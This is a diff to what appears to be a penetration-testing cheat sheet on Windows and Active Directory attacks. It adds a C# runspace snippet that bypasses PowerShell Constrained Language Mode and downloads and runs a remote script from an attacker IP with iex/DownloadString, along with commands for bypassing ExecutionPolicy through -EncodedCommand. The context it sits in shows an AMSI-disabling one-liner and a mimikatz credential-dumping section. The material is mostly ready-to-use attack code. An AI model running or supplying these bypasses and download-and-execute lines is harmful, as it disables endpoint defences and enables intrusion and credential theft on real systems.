@@ -279,11 +279,38 @@ patching AMSI from Powershell6 :
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
   
-### 
+### ConstrainLanguageMode
+
+Bypass CLM using **runspace**:
+
+```cs
+static void Main(string[] args){
+    Runspace run = RunspaceFactory.CreateRunspace();
+    run.Open();
+
+    PowerShell shell = PowerShell.Create();
+    shell.Runspace = run;
+
+    String cmd = "iex(new-object net.webclient).DownloadString('http://10.10.14.33/script')";
+    shell.AddScript(cmd);
+    shell.Invoke();
+    run.Close();
+}
+```
+
+### Just Enough Administration
   
-###
-  
-###
+### ExecutionPolicy
+
+```powershell
+powershell -ExecutionPolicy Bypass -File C:\script.ps1
+```
+
+bypass EP using encoding :
+
+```powershell
+$command = "Write-Host 'hello world'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command);$encoded = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encoded
+```
 
 ### RunAsPPL for Credentials Dumping
 
@@ -299,7 +326,7 @@ mimikatz # !-
 ```
 
 
-## MS Exhchange 
+## MS Exchange 
 
 
 
